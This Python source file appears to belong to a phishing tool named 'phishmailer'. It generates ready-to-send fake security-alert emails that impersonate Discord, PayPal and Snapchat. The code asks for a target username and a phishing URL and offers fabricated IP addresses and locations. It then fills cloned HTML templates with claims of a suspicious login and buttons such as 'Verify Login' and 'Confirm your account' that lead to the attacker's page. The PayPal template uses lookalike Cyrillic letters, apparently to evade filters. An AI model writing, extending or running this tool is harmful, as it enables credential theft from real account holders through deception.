import os
import sys
from Core.helper.date import monthName
from Core.helper.color import green, white, blue, start, alert, numbering

def IpPick():
	global GenIp
	global City
	global Country
	
	print("\n" + start + " Do You Have An Ip To Use Or Do You Want To Use A Pre-Generated One")
	print(numbering(1) + white + " Your Own Ip (Might Need County And City)")
	print(numbering(2) + white + " Pre-Generated Ip")
	print("")
	
	IpPick = int(input(green + "root@phishmailer/Ip:~ "))
	print("")
	
	if IpPick == 1:
		GenIp = input(start + " Enter Your Ip: ")
		Country = input(start + " Enter Country (might not be used): ")
		City = input(start + " Enter City (might not be used): ")
		
	elif IpPick == 2:
		print(numbering(1) + white + " 84.158.45.15 |" + blue + " Country:" + white + " Germany" + white + "   |" + blue + " City:" + white + " Eutin")
		print(numbering(2) + white + " 126.121.51.5 |" + blue + " Country:" + white + " Japan" + white + "     |" + blue + " City:" + white + " Toride")
		print(numbering(3) + white + " 43.158.42.67 |" + blue + " Country:" + white + " Australia" + white + " |" + blue + " City:" + white + " Balranald")
		print(numbering(4) + white + " 85.168.45.15 |" + blue + " Country:" + white + " France" + white + "    |" + blue + " City:" + white + " Paris")
		print(numbering(5) + white + " 11.54.156.85 |" + blue + " Country:" + white + " Usa" + white + "       |" + blue + " City:" + white + " Kansas")
		
		PreIp = int(input(green + "root@phishmailer/IpPick:~  "))
		
		if PreIp == 1:
			GenIp = ("84.158.45.15")
			Country = ("Germany")
			City = ("Eutin")
		elif PreIp == 2:
			GenIp = ("126.121.51.5")
			Country = ("Japan")
			City = ("Toride")
		elif PreIp == 3:
			GenIp = ("43.158.42.67")
			Country = ("Australia")
			City = ("Balranald")
		elif PreIp == 4:
			GenIp = ("85.168.45.15")
			Country = ("France")
			City = ("Paris")
		elif PreIp == 5:
			GenIp = ("11.54.156.85")
			Country = ("USA")
			City = ("Kansas")
		else:
			print(alert + "Invalid Input")
			print("")
			print(alert + " Going With Ip 84.158.45.15 |" + blue + " Country:" + white + " Germany" + white + "   |" + blue + " City:" + white + " Eutin")
			GenIp = ("84.158.45.15")
			Country = ("Germany")
			City = ("Eutin")
			print("")
			
def Discord():
	username = input(start + " Enter Target Username: ")
	Url = input(start + " Enter Your PhishingUrl: ")
	IpPick()
	
	source = ("""
	<div style="background:#f9f9f9">
	<div style="background-color:#f9f9f9">

	<div style="margin:0px auto;max-width:640px;background:transparent"><table style="font-size:0px;width:100%;background:transparent" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:40px 0px"><div style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="word-break:break-word;font-size:0px;padding:0px" align="center"><table style="border-collapse:collapse;border-spacing:0px" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="width:138px"><a target="_blank" href="{}"><img src="https://cdn.discordapp.com/email_assets/2ec94ed90b8e95d764f2a1c96f33139e.png" title alt width="138" height="38px"></a></td></tr></tbody></table></td></tr></tbody></table></div></td></tr></tbody></table></div>
		  <div style="max-width:640px;margin:0 auto;border-radius:4px;overflow:hidden"><div style="margin:0px auto;max-width:640px;background:#ffffff"><table style="font-size:0px;width:100%;background:#ffffff" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:40px 50px"><div style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="word-break:break-word;font-size:0px;padding:0px" align="left"><div style="color:#737f8d;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:16px;line-height:24px;text-align:left">

	  <h2 style="font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-weight:500;font-size:20px;color:#4f545c;letter-spacing:0.27px">Hello {},</h2>
	<p>Looks like someone tried to sign in to your Discord account from a new location. If it was you, you authorize the login from this site via the link below. If it wasn't you, we recommend that you change your password as soon as possible.</p>
	<p><b>IP-adress:</b> {}<br>
	<b>place:</b> {} {}</p>
	<p>P.S. We strongly recommend that you enable 2-factor authentication (2FA) for your account. Read more at: <a target="_blank" style="font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;color:#7289da" href="{}">https://blog.discordapp.com/keeping-discord-safe-and-sound/</a></p>

			  </div></td></tr><tr><td style="word-break:break-word;font-size:0px;padding:10px 25px;padding-top:20px" align="center"><table style="border-collapse:separate" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="border:none;border-radius:3px;color:white;padding:15px 19px" valign="middle" bgcolor="#7289DA" align="center"><a target="_blank" style="text-decoration:none;line-height:100%;background:#7289da;color:white;font-family:Ubuntu,Helvetica,Arial,sans-serif;font-size:15px;font-weight:normal;text-transform:none;margin:0px" href="{}">
				Verify Login
			  </a></td></tr></tbody></table></td></tr><tr><td style="word-break:break-word;font-size:0px;padding:30px 0px"><p style="font-size:1px;margin:0px auto;border-top:1px solid #dcddde;width:100%"></p></td></tr><tr><td style="word-break:break-word;font-size:0px;padding:0px" align="left"><div style="color:#747f8d;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:13px;line-height:16px;text-align:left">
	<p>Do you need help? <a target="_blank" style="font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;color:#7289da" href="{}">Contact our support</a> or write too us on twitter <a target="_blank" style="font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;color:#7289da" href="{}">@discordapp</a>.<br>
	Leave your <a target="_blank" style="font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;color:#7289da" href="{}">feedback here</a>.</p>

	</div></td></tr></tbody></table></div></td></tr></tbody></table></div>
		  </div><div style="margin:0px auto;max-width:640px;background:transparent"><table style="font-size:0px;width:100%;background:transparent" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:0px"><div style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="word-break:break-word;font-size:0px"><div style="font-size:1px;line-height:12px">&nbsp;</div></td></tr></tbody></table></div></td></tr></tbody></table></div>
		  <div style="margin:0 auto;max-width:640px;background:#ffffff;border-radius:4px;overflow:hidden"><table style="font-size:0px;width:100%;background:#ffffff" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="text-align:center;vertical-align:top;font-size:0px;padding:0px"><div style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="word-break:break-word;font-size:0px;padding:30px 40px 0px 40px" align="center"><div style="color:#43b581;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:18px;font-weight:bold;line-height:16px;text-align:center">KURIOSA #12</div></td></tr><tr><td style="word-break:break-word;font-size:0px;padding:14px 40px 30px 40px" align="center"><div style="color:#737f8d;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:16px;line-height:22px;text-align:center">
			In the original Fallout, a player with less than 4 in intelligence can only communicate with grunts and other noises.
		  </div></td></tr></tbody></table></div></td></tr></tbody></table></div>
		  <div style="margin:0px auto;max-width:640px;background:transparent"><table style="font-size:0px;width:100%;background:transparent" cellspacing="0" cellpadding="0" border="0" align="center"><tbody><tr><td style="text-align:center;vertical-align:top;direction:ltr;font-size:0px;padding:20px 0px"><div style="vertical-align:top;display:inline-block;direction:ltr;font-size:13px;text-align:left;width:100%"><table width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="word-break:break-word;font-size:0px;padding:0px" align="center"><div style="color:#99aab5;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:12px;line-height:24px;text-align:center">
		  Sent By Discord • <a target="_blank" style="color:#1eb0f4;text-decoration:none" href="{}">check out our blog</a> • <a target="_blank" style="color:#1eb0f4;text-decoration:none" href="{}">@discordapp</a>
		</div></td></tr><tr><td style="word-break:break-word;font-size:0px;padding:0px" align="center"><div style="color:#99aab5;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:12px;line-height:24px;text-align:center">
		  444 De Haro Street, Suite 200, San Francisco, CA 94107
		</div></td></tr><tr><td style="word-break:break-word;font-size:0px;padding:0px" align="left"><div style="color:#000000;font-family:Whitney,Helvetica Neue,Helvetica,Arial,Lucida Grande,sans-serif;font-size:13px;line-height:22px;text-align:left">
			<img src="https://discordapp.com/api/science/642073818218889226/371f0b49-5c8b-4e8d-bd35-96520d1bc9e7.gif?properties=eyJlbWFpbF90eXBlIjogInVzZXJfaXBfYXV0aG9yaXplIn0%3D" width="1" height="1">
		  </div></td></tr></tbody></table></div></td></tr></tbody></table></div></div>
	<img src="http://email.mailgun.discordapp.com/o/eJwVzDkOwyAQQNHThBIxMGwFRSyRe7DFJrLBMsn9g4tf_OZlhwUzRFIdZ2ABZlwIZijQ5ekB50mP_sWFeSA7Qt3XX6O5jtSvHM6Tpn6QzcVomWFKpiyCNTEwnRJqA-8ildIGyeVC-_ZGt_ApjfZ9jN4muN7ibfwBMOAoug" alt width="1px" height="1px"></div>
	</div></div>""".format(Url, username, GenIp, Country, City, Url, Url, Url, Url, Url, Url, Url))

	filename = input(start + " Enter Name On HTML File: ")
	TXTname = input(start + "  Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")
	
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(source)
	TXT_file.close()
	print(alert + " TXT file Created")

def Paypal1():
	PhishUrl = input(start + " Enter Phishing Url: ")
	
	IpPick()
	
	letter1 = ("""
		<html><head>

			<title></title>

	</head>

	<body>

	<div class="adL">

	<table align="center" bgcolor="#f9f9f9" border="0" cellpadding="0" cellspacing="0" class="m_8991478119753596533ecxinnermain" style="table-layout: fixed;" width="440">

			<tbody>

					<tr>

							<td colspan="4">

							<table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" style="border-style: solid; border-color: rgb(239, 239, 239);" width="100%">

									<tbody>

											<tr style="color: rgb(102, 102, 102); line-height: 20px; font-family: Arial, Helvetica, sans-serif; font-size: 14px;">

													<td align="center" class="m_8991478119753596533ecxcontent" colspan="2" style="padding-right: 40px; padding-left: 40px;" valign="top">

													<table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" width="100%">

															<tbody>

																	<tr>

																			<td align="left">

																			<p><h1 class="size-34" lang="x-size-34" style="Margin-top: 0;Margin-bottom: 0;font-style: normal;font-weight: normal;color: #3e4751;font-size: 30px;line-height: 38px;font-family: Century Gothic, sans-serif;text-align: left;"><span class="font-lato" style="line-height: inherit;"><span style="color: #024087;font-style: italic;font-weight: bold;line-height: inherit;">Ρаy</span><span style="color: #167cf0;font-style: italic;font-weight: bold;line-height: inherit;">Ρаl</span></span></h1></p>



																			<p><span style="color: rgb(72, 84, 93); line-height: 24px;">An unknown device trying to access to your account :&nbsp;</span></p>

																			</td>

																	</tr>

																	<tr>

																			<td height="20">&nbsp;</td>

																	</tr>

																	<tr>

																			<td align="left" style="color: rgb(72, 84, 93); line-height: 24px; font-weight: bold;">

																			<ul style="list-style: none; padding-left: 0px;">

																					<li>Location : {}</li>

																					<li>IP adress : {}</li>

																					<li>Navigator : Chrome (Windows)</li>

																			</ul>

																			</td>

																	</tr>

																	<tr>

																			<td height="20">&nbsp;</td>

																	</tr>

																	<tr>

																			<td align="left">

																			<p style="color: rgb(72, 84, 93); line-height: 24px;">Please confirm your information for security measures : </p>

																			</td>

																	</tr>

																	<tr>

															
																			<td align="center">
	<table height="40" cellpadding="2" cellspacing="2" style="text-align: left; width: 100%;position:relative;top:10px;">
	  <tbody>
					<tr>

								<td class="button_style" id="button_text" align="center" valign="middle" style="font-family:Helvetica,Arial,sans-serif; font-weight:bold; font-stretch:normal; text-align:center; color:#ffffff; font-size:13px;background:#009CDE; border-radius:7px !important; -webkit-border-radius: 7px !important; -moz-border-radius: 7px !important; -o-border-radius: 7px !important; -ms-border-radius: 7px !important;"><a href="{}" style="color:#ffffff; text-decoration:none; display:block; font-weight:bold;" class=""><span style="color:#ffffff; text-decoration:none; display:block; font-family:Helvetica,Arial,sans-serif; font-weight:bold; font-size:13px; line-height:15px;">Confirm your account</span></a></td>

					</tr>


				  </tbody>
			  </table>



	</td>



																	</tr>

																	<tr>

																			<td height="20">&nbsp;</td>

																	</tr>

																	<tr>

																			<td align="center">&nbsp;</td>

																	</tr>

															</tbody>

													</table>

													</td>

											</tr>

											

									</tbody>

							</table>



							

							</td>

					</tr>

			</tbody>

	</table>

	</div>



	</body></html> """.format(Country, GenIp, PhishUrl))

	filename = input(start + " Enter Name On HTML File: ")
	TXTname = input(start + " Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(letter1)
	Html_file.close()
	print(alert + " HTML File Created")
	
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(letter1)
	TXT_file.close()
	print(alert + " TXT file Created")

def Snapchat():
	username = input(start + " Enter Target Username: ")
	DeviceName = input(start + " Enter Device Name (example BiZken's IPhone): ")
	Date = input(start + " Enter Date: ")
	print("")
	print(start + " Enter Month When Login Happend")
	print(numbering(1) + white + " January")
	print(numbering(2) + white + " February")
	print(numbering(3) + white + " March")
	print(numbering(4) + white + " April")
	print(numbering(5) + white + " May")
	print(numbering(6) + white + " June")
	print(numbering(7) + white + " July")
	print(numbering(8) + white + " August")
	print(numbering(9) + white + " September")
	print(numbering(10) + white + " October")
	print(numbering(11) + white + " November")
	print(numbering(12) + white + " December")
	print("")
	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
	month = monthName(monthpick)
	
	print("")
	Time = input(start + " Enter Time (example 11:45:17): ")
	IpPick()
	print("")
	Url = input(start + " Enter Your PhishingUrl: ")
	
	source = ("""
	<div style="background-color:#f6f6f6;color:#000000">
	<center>
		<table style="max-width:620px;border-collapse:collapse;margin:0 auto 0 auto" width="620" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			<tr>
				<td>
					<table style="max-width:580px;padding-left:20px;padding-right:20px" width="580" cellspacing="0" cellpadding="0" border="0">
						<tbody>
						<tr style="height:50px"></tr>
						<tr>
							<td style="line-height:0" align="center">
								<img src="https://storage.googleapis.com/email-media/Hijack_Email_Header.png">
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p style="font-size:45px;color:#000000;letter-spacing:-1.5px">
									Just Logged in!</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-left:20px;padding-right:20px;padding-top:29.8px;font-size:22px;color:#000000;letter-spacing:0;line-height:37px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" border="0" align="left">
								<p>
									<span style="display:block">Hi {},<br><br>it looks like someone logged in to your account from a device named "<span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif">{}</span>"<span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif"> {} {} 2020 </span><span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif">{} UTC</span>. The login happend somewhere near <span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif">{}</span> (IP = <span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif">{}</span>).<br><br>It this was you, you can ignore this email, you don't need to anything<br><br> If this wasn't you, you should change your password on our support-website: <a target="_blank" href="{}"> here</a>.<br><br>Read more about what you can do if someone tried to login to your account<a target="_blank" href="{}"> here</a>.<br><br>Thanks,<br>Team Snapchat<br></span>
								</p>
							</td>
						</tr>
						<tr>
							<td align="center">
								<img src="https://storage.googleapis.com/email-media/Hijack_Email_Footer.png">
							</td>
						</tr>
						<tr>
							<td style="margin-top:0;margin-bottom:0;color:#262626;font-size:17px;padding-top:30px;padding-bottom:70px;letter-spacing:0;line-height:35px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p>
									<span style="display:block">© Snap Inc. 2020 &nbsp;&nbsp;|&nbsp;&nbsp; <a target="_blank" style="text-decoration:none;color:#0eadff" href="{}">Terms</a></span>
									<span style="display:block"><a target="_blank" style="text-decoration:none;color:#000000" href="{}">https://support.snapchat.com</a></span>
									<span style="display:block">Snap Inc., 2772 Donald Douglas Loop North, Santa Monica, CA 90405</span>
								</p>
							</td>
						</tr>
						</tbody>
					</table>
				</td>
			</tr>
			</tbody>
		</table>
	</center>

	<img style="height:1px!important;width:1px!important;border-width:0!important;margin-top:0!important;margin-bottom:0!important;margin-right:0!important;margin-left:0!important;padding-top:0!important;padding-bottom:0!important;padding-right:0!important;padding-left:0!important" alt src="https://u5086036.ct.sendgrid.net/wf/open?upn=VvqtyfCSnsbcZPFWtKaquJZ-2BerosihiCpLkl7yCVpZzgQ00MHub-2FSDh-2BEZsgW-2FyilgmvQ0BcLyxr6ftpSjaPd-2FycbKM9Lq3cXPsekNzTsDplfPG4isjbwAOW5-2F-2Boh1wzEI2YBcpXAsTtQ8ZmHXE289l9xwWubViino9EGCPomTCHrJyFptWK-2FZDtalbCid2MU-2FUUuqpIRQkO7NJUurSYPtJnF77UuT3YnIUp6v-2FRYc-2FFi20PZHy-2BfNFdTVqxMF8uIfx-2Bkytwtymqv5XGOsZsZhd4mu26xAAmJD4-2BFv17RefEvtVuD5NCpfpb-2BLLjIzXqHbHoQu8pPHz3xh09BH7PUjy1E5I2nZrQ-2FWtrNjZiyg958fJ3n1h-2FPftUyu6Y666cEOifgxQnuKqIUlcQJGw5Mw-3D-3D" width="1" height="1" border="0">
	</div>


	</div></div>""".format(username, DeviceName, Date, month, Time, Country, GenIp, Url, Url, Url, Url))

	print("")
	filename = input(start + " Enter Name On HTML File: ")
	TXTname = input(start + " Enter Name On Text file (.txt): ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")
	
	TXT_file = open(TXTname + ".txt","w")
	TXT_file.write(source)
	TXT_file.close()
	print(alert + " TXT file Created")
